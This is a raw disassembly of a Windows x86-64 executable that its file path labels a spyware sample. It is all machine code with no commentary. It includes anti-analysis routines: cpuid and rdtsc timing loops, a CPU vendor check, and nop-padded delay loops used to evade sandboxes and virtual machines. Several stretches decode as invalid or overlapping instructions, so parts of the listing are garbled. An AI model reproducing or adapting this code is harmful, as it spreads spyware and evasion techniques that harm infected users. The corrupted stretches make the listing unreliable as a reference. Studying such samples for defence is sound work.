
malware_samples/spyware/0f687c459b947d072461da1ab5b7b32c26b7d97534a15346322d1ba7cc92e03a.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	48 83 ec 28          	sub    $0x28,%rsp
   140001004:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140001009:	c6 44 24 30 00       	movb   $0x0,0x30(%rsp)
   14000100e:	e8 2d 37 01 00       	call   0x140014740
   140001013:	48 89 05 2a 2f 26 fe 	mov    %rax,-0x1d9d0d6(%rip)        # 0x13e263f44
   14000101a:	ca f8 10             	lret   $0x10f8
   14000101d:	d1 45 de             	roll   $1,-0x22(%rbp)
   140001020:	fe                   	(bad)
   140001021:	fe                   	(bad)
   140001022:	9a                   	(bad)
   140001023:	89 8c 86 89 87 d0 9c 	mov    %ecx,-0x632f7877(%rsi,%rax,4)
   14000102a:	8d 96 fe fe cd dd    	lea    -0x22320102(%rsi),%edx
   140001030:	fe                   	(bad)
   140001031:	fe c8                	dec    %al
   140001033:	d0 cb                	ror    $1,%bl
   140001035:	cc                   	int3
   140001036:	fe                   	(bad)
   140001037:	fe                   	(bad)
   140001038:	fe                   	(bad)
   140001039:	fe                   	(bad)
   14000103a:	63 63 36             	movsxd 0x36(%rbx),%esp
   14000103d:	70 70                	jo     0x1400010af
   14000103f:	36 00 20             	ss add %ah,(%rax)
   140001042:	08 00                	or     %al,(%rax)
   140001044:	48 83 c4 28          	add    $0x28,%rsp
   140001048:	c3                   	ret
   140001049:	cc                   	int3
   14000104a:	cc                   	int3
   14000104b:	cc                   	int3
   14000104c:	cc                   	int3
   14000104d:	cc                   	int3
   14000104e:	cc                   	int3
   14000104f:	cc                   	int3
   140001050:	48 8d 0d e9 13 06 00 	lea    0x613e9(%rip),%rcx        # 0x140062440
   140001057:	e9 c8 b0 03 00       	jmp    0x14003c124
   14000105c:	cc                   	int3
   14000105d:	cc                   	int3
   14000105e:	cc                   	int3
   14000105f:	cc                   	int3
   140001060:	48 8d 0d e9 13 06 00 	lea    0x613e9(%rip),%rcx        # 0x140062450
   140001067:	e9 b8 b0 03 00       	jmp    0x14003c124
   14000106c:	cc                   	int3
   14000106d:	cc                   	int3
   14000106e:	cc                   	int3
   14000106f:	cc                   	int3
   140001070:	40 53                	rex push %rbx
   140001072:	48 83 ec 50          	sub    $0x50,%rsp
   140001076:	48 8d 05 6b 2d 06 00 	lea    0x62d6b(%rip),%rax        # 0x140063de8
   14000107d:	48 c7 44 24 38 0f 00 	movq   $0xf,0x38(%rsp)
   140001084:	00 00 
   140001086:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   14000108b:	33 db                	xor    %ebx,%ebx
   14000108d:	48 8d 05 0c 51 06 00 	lea    0x6510c(%rip),%rax        # 0x1400661a0
   140001094:	48 89 5c 24 48       	mov    %rbx,0x48(%rsp)
   140001099:	0f 10 4c 24 40       	movups 0x40(%rsp),%xmm1
   14000109e:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   1400010a3:	48 8b 05 56 3e 08 00 	mov    0x83e56(%rip),%rax        # 0x140084f00
   1400010aa:	0f 10 44 24 30       	movups 0x30(%rsp),%xmm0
   1400010af:	0f 11 0d da 3f 08 00 	movups %xmm1,0x83fda(%rip)        # 0x140085090
   1400010b6:	0f 11 05 c3 3f 08 00 	movups %xmm0,0x83fc3(%rip)        # 0x140085080
   1400010bd:	90                   	nop
   1400010be:	48 85 c0             	test   %rax,%rax
   1400010c1:	75 1a                	jne    0x1400010dd
   1400010c3:	4c 8d 05 26 33 02 00 	lea    0x23326(%rip),%r8        # 0x1400243f0
   1400010ca:	48 8d 15 4f 31 02 00 	lea    0x2314f(%rip),%rdx        # 0x140024220
   1400010d1:	48 8d 0d 28 3e 08 00 	lea    0x83e28(%rip),%rcx        # 0x140084f00
   1400010d8:	e8 73 40 03 00       	call   0x140035150
   1400010dd:	4c 8b 0d 1c 3e 08 00 	mov    0x83e1c(%rip),%r9        # 0x140084f00
   1400010e4:	4c 8d 15 95 3f 08 00 	lea    0x83f95(%rip),%r10        # 0x140085080
   1400010eb:	49 8b 41 78          	mov    0x78(%r9),%rax
   1400010ef:	49 39 81 80 00 00 00 	cmp    %rax,0x80(%r9)
   1400010f6:	75 75                	jne    0x14000116d
   1400010f8:	45 8b 81 8c 00 00 00 	mov    0x8c(%r9),%r8d
   1400010ff:	4a 8d 14 c0          	lea    (%rax,%r8,8),%rdx
   140001103:	48 3b c2             	cmp    %rdx,%rax
   140001106:	74 3e                	je     0x140001146
   140001108:	48 8b 08             	mov    (%rax),%rcx
   14000110b:	49 3b ca             	cmp    %r10,%rcx
   14000110e:	74 2b                	je     0x14000113b
   140001110:	48 83 f9 fe          	cmp    $0xfffffffffffffffe,%rcx
   140001114:	48 0f 44 d8          	cmove  %rax,%rbx
   140001118:	48 83 c0 08          	add    $0x8,%rax
   14000111c:	48 3b c2             	cmp    %rdx,%rax
   14000111f:	75 e7                	jne    0x140001108
   140001121:	48 85 db             	test   %rbx,%rbx
   140001124:	74 20                	je     0x140001146
   140001126:	4c 89 13             	mov    %r10,(%rbx)
   140001129:	41 ff 89 90 00 00 00 	decl   0x90(%r9)
   140001130:	c6 44 24 28 01       	movb   $0x1,0x28(%rsp)
   140001135:	48 83 c4 50          	add    $0x50,%rsp
   140001139:	5b                   	pop    %rbx
   14000113a:	c3                   	ret
   14000113b:	c6 44 24 28 00       	movb   $0x0,0x28(%rsp)
   140001140:	48 83 c4 50          	add    $0x50,%rsp
   140001144:	5b                   	pop    %rbx
   140001145:	c3                   	ret
   140001146:	45 3b 81 88 00 00 00 	cmp    0x88(%r9),%r8d
   14000114d:	73 1e                	jae    0x14000116d
   14000114f:	4c 89 12             	mov    %r10,(%rdx)
   140001152:	41 8b 81 8c 00 00 00 	mov    0x8c(%r9),%eax
   140001159:	ff c0                	inc    %eax
   14000115b:	c6 44 24 28 01       	movb   $0x1,0x28(%rsp)
   140001160:	41 89 81 8c 00 00 00 	mov    %eax,0x8c(%r9)
   140001167:	48 83 c4 50          	add    $0x50,%rsp
   14000116b:	5b                   	pop    %rbx
   14000116c:	c3                   	ret
   14000116d:	4d 8b c2             	mov    %r10,%r8
   140001170:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140001175:	49 8d 49 78          	lea    0x78(%r9),%rcx
   140001179:	e8 d2 38 03 00       	call   0x140034a50
   14000117e:	48 83 c4 50          	add    $0x50,%rsp
   140001182:	5b                   	pop    %rbx
   140001183:	c3                   	ret
   140001184:	cc                   	int3
   140001185:	cc                   	int3
   140001186:	cc                   	int3
   140001187:	cc                   	int3
   140001188:	cc                   	int3
   140001189:	cc                   	int3
   14000118a:	cc                   	int3
   14000118b:	cc                   	int3
   14000118c:	cc                   	int3
   14000118d:	cc                   	int3
   14000118e:	cc                   	int3
   14000118f:	cc                   	int3
   140001190:	40 53                	rex push %rbx
   140001192:	48 83 ec 50          	sub    $0x50,%rsp
   140001196:	48 8d 05 4b 2c 06 00 	lea    0x62c4b(%rip),%rax        # 0x140063de8
   14000119d:	48 c7 44 24 38 0f 00 	movq   $0xf,0x38(%rsp)
   1400011a4:	00 00 
   1400011a6:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   1400011ab:	33 db                	xor    %ebx,%ebx
   1400011ad:	48 8d 05 4c 50 06 00 	lea    0x6504c(%rip),%rax        # 0x140066200
   1400011b4:	48 89 5c 24 48       	mov    %rbx,0x48(%rsp)
   1400011b9:	0f 10 4c 24 40       	movups 0x40(%rsp),%xmm1
   1400011be:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   1400011c3:	48 8b 05 36 3d 08 00 	mov    0x83d36(%rip),%rax        # 0x140084f00
   1400011ca:	0f 10 44 24 30       	movups 0x30(%rsp),%xmm0
   1400011cf:	0f 11 0d 62 3d 08 00 	movups %xmm1,0x83d62(%rip)        # 0x140084f38
   1400011d6:	0f 11 05 4b 3d 08 00 	movups %xmm0,0x83d4b(%rip)        # 0x140084f28
   1400011dd:	90                   	nop
   1400011de:	48 85 c0             	test   %rax,%rax
   1400011e1:	75 1a                	jne    0x1400011fd
   1400011e3:	4c 8d 05 06 32 02 00 	lea    0x23206(%rip),%r8        # 0x1400243f0
   1400011ea:	48 8d 15 2f 30 02 00 	lea    0x2302f(%rip),%rdx        # 0x140024220
   1400011f1:	48 55                	rex.W push %rbp
   1400011f3:	48 89 e5             	mov    %rsp,%rbp
   1400011f6:	48 83 ec 48          	sub    $0x48,%rsp
   1400011fa:	41 81 f1 47 65 6e 75 	xor    $0x756e6547,%r9d
   140001201:	44 8b cb             	mov    %ebx,%r9d
   140001204:	44 8b c1             	mov    %ecx,%r8d
   140001207:	41 8d 43 01          	lea    0x1(%r11),%eax
   14000120b:	44 8b d2             	mov    %edx,%r10d
   14000120e:	48 83 c0 08          	add    $0x8,%rax
   140001212:	e8 17 00 00 00       	call   0x14000122e
   140001217:	48 85 c0             	test   %rax,%rax
   14000121a:	74 05                	je     0x140001221
   14000121c:	e9 e0 01 00 00       	jmp    0x140001401
   140001221:	eb 02                	jmp    0x140001225
   140001223:	eb 02                	jmp    0x140001227
   140001225:	33 c0                	xor    %eax,%eax
   140001227:	c8 48 83 c4          	enter  $0x8348,$0xc4
   14000122b:	48 5d                	rex.W pop %rbp
   14000122d:	c3                   	ret
   14000122e:	48 c7 c6 00 00 00 00 	mov    $0x0,%rsi
   140001235:	90                   	nop
   140001236:	90                   	nop
   140001237:	48 8b c6             	mov    %rsi,%rax
   14000123a:	90                   	nop
   14000123b:	90                   	nop
   14000123c:	0f a2                	cpuid
   14000123e:	90                   	nop
   14000123f:	90                   	nop
   140001240:	b8 01 00 00 00       	mov    $0x1,%eax
   140001245:	90                   	nop
   140001246:	90                   	nop
   140001247:	0f a2                	cpuid
   140001249:	90                   	nop
   14000124a:	90                   	nop
   14000124b:	49 b8 00 28 6b ee 00 	movabs $0xee6b2800,%r8
   140001252:	00 00 00 
   140001255:	90                   	nop
   140001256:	90                   	nop
   140001257:	0f a2                	cpuid
   140001259:	90                   	nop
   14000125a:	90                   	nop
   14000125b:	0f 31                	rdtsc
   14000125d:	90                   	nop
   14000125e:	90                   	nop
   14000125f:	48 c1 e2 20          	shl    $0x20,%rdx
   140001263:	90                   	nop
   140001264:	90                   	nop
   140001265:	48 0b c2             	or     %rdx,%rax
   140001268:	90                   	nop
   140001269:	90                   	nop
   14000126a:	48 8b c8             	mov    %rax,%rcx
   14000126d:	90                   	nop
   14000126e:	90                   	nop
   14000126f:	90                   	nop
   140001270:	90                   	nop
   140001271:	48 33 d2             	xor    %rdx,%rdx
   140001274:	90                   	nop
   140001275:	90                   	nop
   140001276:	53                   	push   %rbx
   140001277:	90                   	nop
   140001278:	90                   	nop
   140001279:	5b                   	pop    %rbx
   14000127a:	d9 eb                	fldpi
   14000127c:	90                   	nop
   14000127d:	90                   	nop
   14000127e:	d9 fc                	frndint
   140001280:	90                   	nop
   140001281:	90                   	nop
   140001282:	0f 31                	rdtsc
   140001284:	90                   	nop
   140001285:	90                   	nop
   140001286:	48 c1 e2 20          	shl    $0x20,%rdx
   14000128a:	90                   	nop
   14000128b:	90                   	nop
   14000128c:	48 33 db             	xor    %rbx,%rbx
   14000128f:	90                   	nop
   140001290:	90                   	nop
   140001291:	48 8b da             	mov    %rdx,%rbx
   140001294:	90                   	nop
   140001295:	90                   	nop
   140001296:	48 0b c3             	or     %rbx,%rax
   140001299:	90                   	nop
   14000129a:	90                   	nop
   14000129b:	48 2b c1             	sub    %rcx,%rax
   14000129e:	90                   	nop
   14000129f:	90                   	nop
   1400012a0:	90                   	nop
   1400012a1:	4d 33 d2             	xor    %r10,%r10
   1400012a4:	90                   	nop
   1400012a5:	90                   	nop
   1400012a6:	4c 8b d0             	mov    %rax,%r10
   1400012a9:	90                   	nop
   1400012aa:	90                   	nop
   1400012ab:	4d 3b d0             	cmp    %r8,%r10
   1400012ae:	90                   	nop
   1400012af:	90                   	nop
   1400012b0:	72 c8                	jb     0x14000127a
   1400012b2:	55                   	push   %rbp
   1400012b3:	90                   	nop
   1400012b4:	90                   	nop
   1400012b5:	48 8b d4             	mov    %rsp,%rdx
   1400012b8:	48 83 ec 08          	sub    $0x8,%rsp
   1400012bc:	90                   	nop
   1400012bd:	90                   	nop
   1400012be:	49 c7 c2 10 00 00 00 	mov    $0x10,%r10
   1400012c5:	48 c7 c2 c3 a0 e8 04 	mov    $0x4e8a0c3,%rdx
   1400012cc:	90                   	nop
   1400012cd:	90                   	nop
   1400012ce:	48 33 c9             	xor    %rcx,%rcx
   1400012d1:	48 ff ca             	dec    %rdx
   1400012d4:	90                   	nop
   1400012d5:	90                   	nop
   1400012d6:	48 8b f2             	mov    %rdx,%rsi
   1400012d9:	90                   	nop
   1400012da:	90                   	nop
   1400012db:	4d 33 c9             	xor    %r9,%r9
   1400012de:	90                   	nop
   1400012df:	90                   	nop
   1400012e0:	48 83 fa 00          	cmp    $0x0,%rdx
   1400012e4:	90                   	nop
   1400012e5:	90                   	nop
   1400012e6:	75 e9                	jne    0x1400012d1
   1400012e8:	48 8b f0             	mov    %rax,%rsi
   1400012eb:	90                   	nop
   1400012ec:	90                   	nop
   1400012ed:	48 03 f2             	add    %rdx,%rsi
   1400012f0:	90                   	nop
   1400012f1:	90                   	nop
   1400012f2:	49 ff ca             	dec    %r10
   1400012f5:	90                   	nop
   1400012f6:	90                   	nop
   1400012f7:	4d 33 db             	xor    %r11,%r11
   1400012fa:	90                   	nop
   1400012fb:	90                   	nop
   1400012fc:	49 83 fa 00          	cmp    $0x0,%r10
   140001300:	75 c3                	jne    0x1400012c5
   140001302:	48 c7 c0 02 00 00 00 	mov    $0x2,%rax
   140001309:	48 83 c4 08          	add    $0x8,%rsp
   14000130d:	5d                   	pop    %rbp
   14000130e:	c3                   	ret
   14000130f:	08 00                	or     %al,(%rax)
   140001311:	e8 5a 17 02 00       	call   0x140022a70
   140001316:	90                   	nop
   140001317:	33 db                	xor    %ebx,%ebx
   140001319:	8b cb                	mov    %ebx,%ecx
   14000131b:	48 89 1d be 40 08 00 	mov    %rbx,0x840be(%rip)        # 0x1400853e0
   140001322:	48 8d 05 ef 4f 06 00 	lea    0x64fef(%rip),%rax        # 0x140066318
   140001329:	48 89 05 b8 40 08 00 	mov    %rax,0x840b8(%rip)        # 0x1400853e8
   140001330:	48 8d 05 f9 4f 06 00 	lea    0x64ff9(%rip),%rax        # 0x140066330
   140001337:	48 89 05 22 40 08 00 	mov    %rax,0x84022(%rip)        # 0x140085360
   14000133e:	48 8d 05 73 4e 06 00 	lea    0x64e73(%rip),%rax        # 0x1400661b8
   140001345:	48 89 05 a4 40 08 00 	mov    %rax,0x840a4(%rip)        # 0x1400853f0
   14000134c:	48 8d 05 a5 50 06 00 	lea    0x650a5(%rip),%rax        # 0x1400663f8
   140001353:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001358:	48 c7 44 24 28 0b 00 	movq   $0xb,0x28(%rsp)
   14000135f:	00 00 
   140001361:	0f b7 05 02 40 08 00 	movzwl 0x84002(%rip),%eax        # 0x14008536a
   140001368:	be 00 40 00 00       	mov    $0x4000,%esi
   14000136d:	0f 28 44 24 20       	movaps 0x20(%rsp),%xmm0
   140001372:	66 85 c6             	test   %ax,%si
   140001375:	74 58                	je     0x1400013cf
   140001377:	66 0f 7f 44 24 50    	movdqa %xmm0,0x50(%rsp)
   14000137d:	48 8b 05 7c 3b 08 00 	mov    0x83b7c(%rip),%rax        # 0x140084f00
   140001384:	90                   	nop
   140001385:	48 85 c0             	test   %rax,%rax
   140001388:	75 1a                	jne    0x1400013a4
   14000138a:	4c 8d 05 5f 30 02 00 	lea    0x2305f(%rip),%r8        # 0x1400243f0
   140001391:	48 8d 15 88 2e 02 00 	lea    0x22e88(%rip),%rdx        # 0x140024220
   140001398:	48 8d 0d 61 3b 08 00 	lea    0x83b61(%rip),%rcx        # 0x140084f00
   14000139f:	e8 ac 3d 03 00       	call   0x140035150
   1400013a4:	48 8b 0d 55 3b 08 00 	mov    0x83b55(%rip),%rcx        # 0x140084f00
   1400013ab:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   1400013b0:	48 8d 15 a9 3f 08 00 	lea    0x83fa9(%rip),%rdx        # 0x140085360
   1400013b7:	e8 74 63 02 00       	call   0x140027730
   1400013bc:	0f 28 44 24 20       	movaps 0x20(%rsp),%xmm0
   1400013c1:	48 8b 0d 18 40 08 00 	mov    0x84018(%rip),%rcx        # 0x1400853e0
   1400013c8:	0f b7 05 9b 3f 08 00 	movzwl 0x83f9b(%rip),%eax        # 0x14008536a
   1400013cf:	0f 29 05 9a 3f 08 00 	movaps %xmm0,0x83f9a(%rip)        # 0x140085370
   1400013d6:	0f 10 44 24 30       	movups 0x30(%rsp),%xmm0
   1400013db:	0f 29 05 9e 3f 08 00 	movaps %xmm0,0x83f9e(%rip)        # 0x140085380
   1400013e2:	48 85 c9             	test   %rcx,%rcx
   1400013e5:	74 47                	je     0x14000142e
   1400013e7:	66 c7 84 24 80 00 00 	movw   $0x103,0x80(%rsp)
   1400013ee:	00 03 01 
   1400013f1:	48 8d 05 f0 4c 06 00 	lea    0x64cf0(%rip),%rax        # 0x1400660e8
   1400013f8:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   1400013fd:	48 89 5c 24 48       	mov    %rbx,0x48(%rsp)
   140001402:	c7 c1 cf 5e c1 52    	mov    $0x52c15ecf,%ecx
   140001408:	e9 04 06 00 00       	jmp    0x140001a11
   14000140d:	8b c8                	mov    %eax,%ecx
   14000140f:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   140001414:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   140001419:	48 8d 0d 40 3f 08 00 	lea    0x83f40(%rip),%rcx        # 0x140085360
   140001420:	e8 fb 33 02 00       	call   0x140024820
   140001425:	0f b7 05 3e 3f 08 00 	movzwl 0x83f3e(%rip),%eax        # 0x14008536a
   14000142c:	eb 0e                	jmp    0x14000143c
   14000142e:	48 8d 0d 7b 1d 08 00 	lea    0x81d7b(%rip),%rcx        # 0x1400831b0
   140001435:	48 89 0d a4 3f 08 00 	mov    %rcx,0x83fa4(%rip)        # 0x1400853e0
   14000143c:	b9 bf ff 00 00       	mov    $0xffbf,%ecx
   140001441:	66 23 c1             	and    %cx,%ax
   140001444:	66 83 c8 38          	or     $0x38,%ax
   140001448:	66 89 05 1b 3f 08 00 	mov    %ax,0x83f1b(%rip)        # 0x14008536a
   14000144f:	48 8d 05 2a 3c 08 00 	lea    0x83c2a(%rip),%rax        # 0x140085080
   140001456:	48 8b 0d 43 3f 08 00 	mov    0x83f43(%rip),%rcx        # 0x1400853a0
   14000145d:	48 8d 1d c4 3a 08 00 	lea    0x83ac4(%rip),%rbx        # 0x140084f28
   140001464:	48 39 01             	cmp    %rax,(%rcx)
   140001467:	75 05                	jne    0x14000146e
   140001469:	48 89 19             	mov    %rbx,(%rcx)
   14000146c:	eb 61                	jmp    0x1400014cf
   14000146e:	44 8b 05 33 3f 08 00 	mov    0x83f33(%rip),%r8d        # 0x1400853a8
   140001475:	4a 8d 14 c1          	lea    (%rcx,%r8,8),%rdx
   140001479:	48 8b c1             	mov    %rcx,%rax
   14000147c:	48 3b ca             	cmp    %rdx,%rcx
   14000147f:	74 0e                	je     0x14000148f
   140001481:	48 39 18             	cmp    %rbx,(%rax)
   140001484:	74 49                	je     0x1400014cf
   140001486:	48 83 c0 08          	add    $0x8,%rax
   14000148a:	48 3b c2             	cmp    %rdx,%rax
   14000148d:	75 f2                	jne    0x140001481
   14000148f:	44 3b 05 16 3f 08 00 	cmp    0x83f16(%rip),%r8d        # 0x1400853ac
   140001496:	72 2a                	jb     0x1400014c2
   140001498:	41 b9 08 00 00 00    	mov    $0x8,%r9d
   14000149e:	45 33 c0             	xor    %r8d,%r8d
   1400014a1:	48 8d 15 08 3f 08 00 	lea    0x83f08(%rip),%rdx        # 0x1400853b0
   1400014a8:	48 8d 0d f1 3e 08 00 	lea    0x83ef1(%rip),%rcx        # 0x1400853a0
   1400014af:	e8 4c f1 01 00       	call   0x140020600
   1400014b4:	44 8b 05 ed 3e 08 00 	mov    0x83eed(%rip),%r8d        # 0x1400853a8
   1400014bb:	48 8b 0d de 3e 08 00 	mov    0x83ede(%rip),%rcx        # 0x1400853a0
   1400014c2:	41 8b c0             	mov    %r8d,%eax
   1400014c5:	48 89 1c c1          	mov    %rbx,(%rcx,%rax,8)
   1400014c9:	ff 05 d9 3e 08 00    	incl   0x83ed9(%rip)        # 0x1400853a8
   1400014cf:	4c 8b c7             	mov    %rdi,%r8
   1400014d2:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   1400014d7:	48 8d 0d da 3e 08 00 	lea    0x83eda(%rip),%rcx        # 0x1400853b8
   1400014de:	e8 2d 37 02 00       	call   0x140024c10
   1400014e3:	48 8b 05 16 3a 08 00 	mov    0x83a16(%rip),%rax        # 0x140084f00
   1400014ea:	90                   	nop
   1400014eb:	48 85 c0             	test   %rax,%rax
   1400014ee:	75 1a                	jne    0x14000150a
   1400014f0:	4c 8d 05 f9 2e 02 00 	lea    0x22ef9(%rip),%r8        # 0x1400243f0
   1400014f7:	48 8d 15 22 2d 02 00 	lea    0x22d22(%rip),%rdx        # 0x140024220
   1400014fe:	48 8d 0d fb 39 08 00 	lea    0x839fb(%rip),%rcx        # 0x140084f00
   140001505:	e8 46 3c 03 00       	call   0x140035150
   14000150a:	48 8b 0d ef 39 08 00 	mov    0x839ef(%rip),%rcx        # 0x140084f00
   140001511:	45 33 c0             	xor    %r8d,%r8d
   140001514:	48 8d 15 45 3e 08 00 	lea    0x83e45(%rip),%rdx        # 0x140085360
   14000151b:	e8 70 2b 02 00       	call   0x140024090
   140001520:	66 09 35 43 3e 08 00 	or     %si,0x83e43(%rip)        # 0x14008536a
   140001527:	48 8d 0d 32 0f 06 00 	lea    0x60f32(%rip),%rcx        # 0x140062460
   14000152e:	4c 8d 9c 24 90 00 00 	lea    0x90(%rsp),%r11
   140001535:	00 
   140001536:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   14000153a:	49 8b 73 18          	mov    0x18(%r11),%rsi
   14000153e:	49 8b e3             	mov    %r11,%rsp
   140001541:	5f                   	pop    %rdi
   140001542:	e9 dd ab 03 00       	jmp    0x14003c124
   140001547:	cc                   	int3
   140001548:	cc                   	int3
   140001549:	cc                   	int3
   14000154a:	cc                   	int3
   14000154b:	cc                   	int3
   14000154c:	cc                   	int3
   14000154d:	cc                   	int3
   14000154e:	cc                   	int3
   14000154f:	cc                   	int3
   140001550:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001555:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000155a:	57                   	push   %rdi
   14000155b:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   140001562:	48 8d 05 67 4d 06 00 	lea    0x64d67(%rip),%rax        # 0x1400662d0
   140001569:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   14000156e:	48 c7 44 24 38 25 00 	movq   $0x25,0x38(%rsp)
   140001575:	00 00 
   140001577:	48 8b 05 6a 39 08 00 	mov    0x8396a(%rip),%rax        # 0x140084ee8
   14000157e:	90                   	nop
   14000157f:	48 85 c0             	test   %rax,%rax
   140001582:	75 1a                	jne    0x14000159e
   140001584:	4c 8d 05 65 2f 02 00 	lea    0x22f65(%rip),%r8        # 0x1400244f0
   14000158b:	48 8d 15 be 2d 02 00 	lea    0x22dbe(%rip),%rdx        # 0x140024350
   140001592:	48 8d 0d 4f 39 08 00 	lea    0x8394f(%rip),%rcx        # 0x140084ee8
   140001599:	e8 b2 3b 03 00       	call   0x140035150
   14000159e:	48 8b 3d 43 39 08 00 	mov    0x83943(%rip),%rdi        # 0x140084ee8
   1400015a5:	45 33 c0             	xor    %r8d,%r8d
   1400015a8:	33 d2                	xor    %edx,%edx
   1400015aa:	48 8d 0d 0f 3d 08 00 	lea    0x83d0f(%rip),%rcx        # 0x1400852c0
   1400015b1:	e8 ba 14 02 00       	call   0x140022a70
   1400015b6:	90                   	nop
   1400015b7:	33 db                	xor    %ebx,%ebx
   1400015b9:	8b cb                	mov    %ebx,%ecx
   1400015bb:	48 89 1d 7e 3d 08 00 	mov    %rbx,0x83d7e(%rip)        # 0x140085340
   1400015c2:	48 8d 05 4f 4c 06 00 	lea    0x64c4f(%rip),%rax        # 0x140066218
   1400015c9:	48 89 05 78 3d 08 00 	mov    %rax,0x83d78(%rip)        # 0x140085348
   1400015d0:	48 8d 05 59 4c 06 00 	lea    0x64c59(%rip),%rax        # 0x140066230
   1400015d7:	48 89 05 e2 3c 08 00 	mov    %rax,0x83ce2(%rip)        # 0x1400852c0
   1400015de:	48 8d 05 d3 4b 06 00 	lea    0x64bd3(%rip),%rax        # 0x1400661b8
   1400015e5:	48 89 05 64 3d 08 00 	mov    %rax,0x83d64(%rip)        # 0x140085350
   1400015ec:	48 8d 05 05 4d 06 00 	lea    0x64d05(%rip),%rax        # 0x1400662f8
   1400015f3:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400015f8:	48 c7 44 24 28 10 00 	movq   $0x10,0x28(%rsp)
   1400015ff:	00 00 
   140001601:	0f b7 05 c2 3c 08 00 	movzwl 0x83cc2(%rip),%eax        # 0x1400852ca
   140001608:	be 00 40 00 00       	mov    $0x4000,%esi
   14000160d:	0f 28 44 24 20       	movaps 0x20(%rsp),%xmm0
   140001612:	66 85 c6             	test   %ax,%si
   140001615:	74 58                	je     0x14000166f
   140001617:	66 0f 7f 44 24 50    	movdqa %xmm0,0x50(%rsp)
   14000161d:	48 8b 05 dc 38 08 00 	mov    0x838dc(%rip),%rax        # 0x140084f00
   140001624:	90                   	nop
   140001625:	48 85 c0             	test   %rax,%rax
   140001628:	75 1a                	jne    0x140001644
   14000162a:	4c 8d 05 bf 2d 02 00 	lea    0x22dbf(%rip),%r8        # 0x1400243f0
   140001631:	48 8d 15 e8 2b 02 00 	lea    0x22be8(%rip),%rdx        # 0x140024220
   140001638:	48 8d 0d c1 38 08 00 	lea    0x838c1(%rip),%rcx        # 0x140084f00
   14000163f:	e8 0c 3b 03 00       	call   0x140035150
   140001644:	48 8b 0d b5 38 08 00 	mov    0x838b5(%rip),%rcx        # 0x140084f00
   14000164b:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   140001650:	48 8d 15 69 3c 08 00 	lea    0x83c69(%rip),%rdx        # 0x1400852c0
   140001657:	e8 d4 60 02 00       	call   0x140027730
   14000165c:	0f 28 44 24 20       	movaps 0x20(%rsp),%xmm0
   140001661:	48 8b 0d d8 3c 08 00 	mov    0x83cd8(%rip),%rcx        # 0x140085340
   140001668:	0f b7 05 5b 3c 08 00 	movzwl 0x83c5b(%rip),%eax        # 0x1400852ca
   14000166f:	0f 29 05 5a 3c 08 00 	movaps %xmm0,0x83c5a(%rip)        # 0x1400852d0
   140001676:	0f 10 44 24 30       	movups 0x30(%rsp),%xmm0
   14000167b:	0f 29 05 5e 3c 08 00 	movaps %xmm0,0x83c5e(%rip)        # 0x1400852e0
   140001682:	48 85 c9             	test   %rcx,%rcx
   140001685:	74 47                	je     0x1400016ce
   140001687:	66 c7 84 24 80 00 00 	movw   $0x103,0x80(%rsp)
   14000168e:	00 03 01 
   140001691:	48 8d 05 50 4a 06 00 	lea    0x64a50(%rip),%rax        # 0x1400660e8
   140001698:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   14000169d:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   1400016a2:	48 89 5c 24 48       	mov    %rbx,0x48(%rsp)
   1400016a7:	e8 b4 45 03 00       	call   0x140035c60
   1400016ac:	4c 8b c8             	mov    %rax,%r9
   1400016af:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   1400016b4:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   1400016b9:	48 8d 0d 00 3c 08 00 	lea    0x83c00(%rip),%rcx        # 0x1400852c0
   1400016c0:	e8 5b 31 02 00       	call   0x140024820
   1400016c5:	0f b7 05 fe 3b 08 00 	movzwl 0x83bfe(%rip),%eax        # 0x1400852ca
   1400016cc:	eb 0e                	jmp    0x1400016dc
   1400016ce:	48 8d 0d 9b 1a 08 00 	lea    0x81a9b(%rip),%rcx        # 0x140083170
   1400016d5:	48 89 0d 64 3c 08 00 	mov    %rcx,0x83c64(%rip)        # 0x140085340
   1400016dc:	b9 bf ff 00 00       	mov    $0xffbf,%ecx
   1400016e1:	66 23 c1             	and    %cx,%ax
   1400016e4:	66 83 c8 38          	or     $0x38,%ax
   1400016e8:	66 89 05 db 3b 08 00 	mov    %ax,0x83bdb(%rip)        # 0x1400852ca
   1400016ef:	48 8d 05 8a 39 08 00 	lea    0x8398a(%rip),%rax        # 0x140085080
   1400016f6:	48 8b 0d 03 3c 08 00 	mov    0x83c03(%rip),%rcx        # 0x140085300
   1400016fd:	48 8d 1d 24 38 08 00 	lea    0x83824(%rip),%rbx        # 0x140084f28
   140001704:	48 39 01             	cmp    %rax,(%rcx)
   140001707:	75 05                	jne    0x14000170e
   140001709:	48 89 19             	mov    %rbx,(%rcx)
   14000170c:	eb 61                	jmp    0x14000176f
   14000170e:	44 8b 05 f3 3b 08 00 	mov    0x83bf3(%rip),%r8d        # 0x140085308
   140001715:	4a 8d 14 c1          	lea    (%rcx,%r8,8),%rdx
   140001719:	48 8b c1             	mov    %rcx,%rax
   14000171c:	48 3b ca             	cmp    %rdx,%rcx
   14000171f:	74 0e                	je     0x14000172f
   140001721:	48 39 18             	cmp    %rbx,(%rax)
   140001724:	74 49                	je     0x14000176f
   140001726:	48 83 c0 08          	add    $0x8,%rax
   14000172a:	48 3b c2             	cmp    %rdx,%rax
